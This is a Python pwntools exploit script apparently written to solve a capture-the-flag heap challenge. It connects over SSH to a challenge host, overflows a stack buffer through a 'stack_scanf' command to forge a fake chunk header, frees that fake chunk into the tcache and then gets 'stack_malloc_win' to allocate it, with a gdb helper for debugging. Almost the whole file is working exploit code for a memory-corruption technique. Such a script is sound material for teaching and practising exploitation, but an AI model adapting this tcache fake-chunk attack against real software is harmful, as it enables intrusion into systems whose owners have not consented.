#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = '12.1'

context.arch = "amd64"

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main
    #b *main+697
    b *main+700
    commands
    x/8gx $rax-0x8
    end
    b *main+1198
    b *main+1466''') # b *+121
    run_exploit(p, False)
    # 8xg

def run_commands_list(commands, p, print_command):
    for command in commands:
        if print_command and not get_flag:
            print('COMMAND: ', command)
            input("")
        print_send_print(command, p)

def print_send_print(line_to_send, p):
    try:
        p.sendline(line_to_send)
        if get_flag:
            print(p.recvrepeat(1).decode())
        else:
            print(p.recvrepeat(0.2).decode())
    except:
        print('Exception in \'print_send_print\'')
        pass

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)

    """
    Using a buffer overflow in the functionality stack_scanf, we're going to overwrite 
    the stack variable used by stack_free (they're conveniently side by side in the stack)
    and make look like a heap chunk (just by setting a size in the first bytes of stack_free - 0x8).
    With a fake chunk, call stack_free that will try to free the fake chunk from the stack 
    and will succeed, putting the fake chunk in tcache.
    Now, call stack_malloc_win and see the function gets the fake chunk from tcache and
    satisfies the check.
    """

    welcome_message = p.recvrepeat(1).decode()
    print(welcome_message)

    overflow_to_stack_free = b'A' * (64 - 8) # overflowing until stack_free (64) - 8 (because metadata)
    fake_chunk_metadata_size = p64(0x0000000000000031) # the size its actually 0x22 but it gets rounded up because heap optimizations and metadata used by stack_malloc_win

    commands = [
            b'stack_scanf ' + overflow_to_stack_free + fake_chunk_metadata_size + p64(0x0) + p64(0x0),
            #b'stack_scanf ' + overflow_to_stack_free + fake_chunk_metadata_size + p64(heap_leak), # overflowing and creating metadata to represent a fake heap chunk
            b'stack_free', # freeing the fake chunk created in the stack and putting him on tcache
            b'stack_malloc_win' # now stack_malloc_win will get the fake chunk from stack
    ]
    run_commands_list(commands, p, True)

    p.interactive()

if get_flag:
    ssh_connection = ssh(host='college',user='hacker')
    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)
    run_exploit(p, False)
    ssh_connection.close()
else:
    p = process('./' + chall_name)
    run_exploit(p, False)
